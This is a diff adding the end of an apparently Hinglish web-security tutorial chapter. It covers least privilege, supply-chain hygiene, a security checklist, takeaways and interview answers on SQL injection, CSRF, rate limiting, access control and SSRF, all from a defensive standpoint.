+<span class="tok-com">-- Read-only reporting ke liye alag user — analytics kabhi likh hi nahi sakta</span>
+
+<span class="tok-com">// CLOUD IAM: "sab kuch allow" ki jagah specific resources</span>
+<span class="tok-com">// ❌ s3:* on *      ✅ s3:GetObject on arn:aws:s3:::my-bucket/uploads/*</span>
+
+<span class="tok-com">// CONTAINERS: non-root user, read-only filesystem, dropped capabilities</span>
+<span class="tok-com">// NETWORK: DB sirf app subnet se reachable, internet se nahi (ch 2 ka security group)</span>
+<span class="tok-com">// SECRETS: per-service credentials — ek leak sab kuch na khole (ch 15)</span>
+</code></pre>
+      </div>
+
+      <h2 id="supply">Dependencies Aur Supply Chain</h2>
+      <p>
+        Tumhare code ka zyadatar hissa tumne likha hi nahi hai. Ek typical Node app mein sainkdon transitive
+        dependencies hoti hain, aur har ek tumhare process ke andar full access ke saath chalti hai.
+      </p>
+      <ul>
+        <li><strong>Lockfile commit karo</strong> aur CI mein <code>npm ci</code> use karo — reproducible builds.</li>
+        <li><strong>Audit automate karo</strong> — <code>npm audit</code>, Dependabot/Renovate. Par version bump
+        ko blindly merge mat karo.</li>
+        <li><strong>Typosquatting</strong> se bacho — <code>reqeusts</code>, <code>lodahs</code> jaise packages
+        real hote hain aur malicious hote hain. Naya package add karte waqt naam dhyan se padho.</li>
+        <li><strong>Postinstall scripts</strong> arbitrary code chalate hain — install ke waqt hi. CI mein
+        <code>--ignore-scripts</code> consider karo.</li>
+        <li><strong>Dependency count kam rakho</strong> — 3-line ke liye package add karna ek permanent attack
+        surface add karna hai.</li>
+      </ul>
+
+      <h2 id="checklist">Security Checklist</h2>
+      <ul>
+        <li>☐ Saari DB queries <strong>parameterized</strong>; identifiers (sort/filter columns) <strong>allowlisted</strong></li>
+        <li>☐ Input validation trust boundary pe, <code>.strict()</code> ke saath (ch 7)</li>
+        <li>☐ <strong>Ownership check query ke andar</strong>; not-found pe 404 (ch 6)</li>
+        <li>☐ <strong>Default deny</strong> — public routes explicitly whitelisted</li>
+        <li>☐ Passwords bcrypt/argon2, ~200–300ms cost (ch 6)</li>
+        <li>☐ Cookies: <code>httpOnly; Secure; SameSite=Lax</code></li>
+        <li>☐ Security headers (helmet) + CSP</li>
+        <li>☐ Rate limiting — login pe IP <em>aur</em> account dono pe; <code>Retry-After</code> ke saath</li>
+        <li>☐ Body size limit + validation depth limit (ch 5)</li>
+        <li>☐ CORS allowlist se, reflect-all nahi</li>
+        <li>☐ Secrets env/secret manager se; logs mein redacted (ch 15, 16)</li>
+        <li>☐ 5xx responses mein internals nahi (ch 14)</li>
+        <li>☐ DB user least privilege; internet se DB reachable nahi</li>
+        <li>☐ Outbound URLs (webhooks) validated — <strong>SSRF</strong></li>
+        <li>☐ File uploads: size, MIME, content check; executable path se bahar store</li>
+        <li>☐ Dependencies audited, lockfile committed</li>
+        <li>☐ TLS everywhere; certificate expiry monitored</li>
+        <li>☐ Auth events aur admin actions <strong>audit log</strong> mein (ch 16)</li>
+      </ul>
+
+      <h2 id="takeaways">Key Takeaways</h2>
+      <ul>
+        <li>Security add-on feature nahi — <strong>har layer ke default decisions ka nateeja</strong> hai. Defence in depth: har layer maane ki upar wali fail ho sakti hai.</li>
+        <li>Saare injections ka ek hi root cause: <strong>data ko code ki tarah interpret karna</strong>.</li>
+        <li>Parameterized queries escaping nahi, <strong>separation</strong> hain — structure aur values alag jaate hain.</li>
+        <li>Identifiers (column/table names) parameterize <em>nahi</em> ho sakte — wahan <strong>allowlist</strong> hi ek raasta hai.</li>
+        <li><strong>SSRF</strong> aksar bhoola jaata hai — user-supplied URL fetch karna cloud metadata se IAM credentials chura sakta hai.</li>
+        <li>XSS ka fix <strong>output encoding</strong> hai (context ke hisaab se), input sanitization nahi. CSP sabse strong defense hai.</li>
+        <li><code>httpOnly</code> cookie XSS-se-token-chori rokti hai; <code>localStorage</code> nahi rok sakta.</li>
+        <li><strong>CORS ek policy hai, CSRF ek attack</strong>. CORS request bhejne se nahi rokta — sirf response padhne se — isliye wo CSRF nahi rok sakta. CSRF ka fix <code>SameSite</code> + token hai.</li>
+        <li><strong>Broken access control OWASP #1</strong> hai kyunki isme koi exploit nahi lagta — bas URL mein ID badalni hai.</li>
+        <li><strong>Default deny</strong> structural fix hai: bhoolne ka nateeja "band" hona chahiye, "khula" nahi.</li>
+        <li>Rate limiting atomic honi chahiye (<code>INCR</code>/Lua), <code>Retry-After</code> ke saath, aur login pe IP <em>aur</em> account dono pe.</li>
+        <li>Proxy ke peeche <code>trust proxy</code> na hone se rate limit sabko ek client samajh ke globally block kar deta hai (ch 2).</li>
+        <li>API terminology: <strong>BOLA</strong> = galat <em>data</em> tak pahunch (IDOR), <strong>BFLA</strong> = galat <em>action</em> tak pahunch (admin endpoint khula). Fixes alag hain.</li>
+        <li><strong>Security misconfiguration</strong> mein koi exploit nahi lagta — default creds, debug mode, khule <code>/metrics</code>, verbose version headers, public S3.</li>
+        <li>Login pe alag error messages ya alag response timing = <strong>user enumeration</strong>. Generic message + dummy hash.</li>
+        <li>Least privilege blast radius chhota karta hai — app DB user ko <code>DROP</code> ka haq kyun ho?</li>
+        <li>Dependencies tumhare process mein full access ke saath chalti hain — lockfile, audit, aur kam dependencies.</li>
+      </ul>
+
+      <h2 id="interview">🎯 Interview Questions</h2>
+      <div class="callout info">
+        <div class="callout-title">Q1. "SQL injection kaise rokoge? Escaping kaafi hai?"</div>
+        <p>
+          <strong>Parameterized queries</strong> — aur wo escaping se behtar isliye hain kyunki wo escaping karte
+          hi nahi: query ka <em>structure</em> DB ko alag se jaata hai aur values alag se, isliye value kabhi SQL
+          syntax ban hi nahi sakti. Khud escaping likhna hamesha adhoora rehta hai (charset, unicode, nested
+          contexts). Ek important exception: <strong>identifiers</strong> — column/table names parameterize nahi
+          ho sakte, isliye <code>ORDER BY ${field}</code> ke liye allowlist chahiye. Aur defence in depth ke liye
+          DB user ko least privilege do.
+        </p>
+      </div>
+      <div class="callout info">
+        <div class="callout-title">Q2. "CSRF aur CORS mein farq? CORS CSRF ko rok sakta hai?"</div>
+        <p>
+          CORS ek browser <em>policy</em> hai, CSRF ek <em>attack</em>. <strong>Nahi</strong>, CORS CSRF ko nahi
+          rok sakta — kyunki CORS request <em>bhejne</em> se nahi rokta, sirf cross-origin
+          <em>response padhne</em> se rokta hai. CSRF mein attacker ko response chahiye hi nahi; usse bas side
+          effect chahiye (transfer ho gaya). Fix: <code>SameSite=Lax/Strict</code> cookie (primary) + CSRF token
+          (defence in depth) — token isliye kaam karta hai kyunki attacker use padh nahi sakta aur browser use
+          apne aap attach nahi karta.
+        </p>
+      </div>
+      <div class="callout info">
+        <div class="callout-title">Q3. "Rate limiting kaise implement karoge, 10 instances ke saath?"</div>
+        <p>
+          Shared store (Redis) chahiye, aur operation <strong>atomic</strong> hona chahiye — <code>INCR</code> +
+          <code>EXPIRE</code> (ya complex algorithms ke liye Lua script). Get-then-set race condition hai.
+          Algorithm: token bucket ya sliding window counter — fixed window mein boundary burst problem hai
+          (59s pe 100 + 61s pe 100). Key selection matter karti hai: login pe IP <em>aur</em> account dono pe
+          (do alag attacks). <code>429</code> ke saath <code>Retry-After</code> zaroori hai. Aur proxy ke peeche
+          real client IP ke liye <code>trust proxy</code> — warna sab <code>127.0.0.1</code> dikhenge.
+        </p>
+      </div>
+      <div class="callout info">
+        <div class="callout-title">Q4. "OWASP #1 kya hai aur usse structurally kaise rokoge?"</div>
+        <p>
+          <strong>Broken access control</strong> — IDOR, mass assignment, client-supplied identity, aur
+          UI-only enforcement. Ye #1 isliye hai ki exploit trivial hai: URL mein ID badal do. Structural fixes,
+          "yaad rakhna" nahi: ownership ko <em>query ke andar</em> daalo
+          (<code>findOne({id, userId: ctx.user.id})</code>), input schema pe <code>.strict()</code> + explicit
+          input model (server-controlled fields us model mein hon hi nahi), identity hamesha verified
+          session/token se, aur <strong>default deny</strong> routing — public routes explicitly whitelist.
+        </p>
+      </div>
+      <div class="callout info">
+        <div class="callout-title">Q5. "Ek endpoint user ka diya hua URL fetch karta hai. Kya risk hai?"</div>
+        <p>
+          <strong>SSRF</strong>. Attacker internal addresses de sakta hai — sabse khatarnak
+          <code>169.254.169.254</code> (cloud metadata), jahan se IAM credentials mil jaate hain; ya internal
+          admin services jo network-level pe "safe" maani gayi thi. Defences: scheme allowlist (sirf https),
+          hostname resolve karke IP check karo aur private/link-local ranges block karo (DNS rebinding se bachne
+          ke liye resolve-aur-connect ek saath), redirects follow mat karo, timeouts + response size cap, aur
+          outbound traffic ko ek egress proxy se guzaro. Cloud pe IMDSv2 enforce karna bhi madad karta hai.
+        </p>
+      </div>
+
+      <div class="callout senior" style="margin-top:34px">
+        <div class="callout-title">➡️ Agla chapter</div>
+        <p>
+          <a href="19-scaling-part-1.html"><strong>Chapter 19 — Scaling & Performance I</strong></a>: system
+          correct, fast, resilient, observable, aur secure hai. Ab traffic 100× ho jaaye toh? Bottlenecks kaise
+          dhoondhein, aur horizontal scaling ki neev.
+        </p>
+      </div>
+
+    </div>
+  </main>
+</div>
+<script src="assets/app.js"></script>
+</body>
+</html>
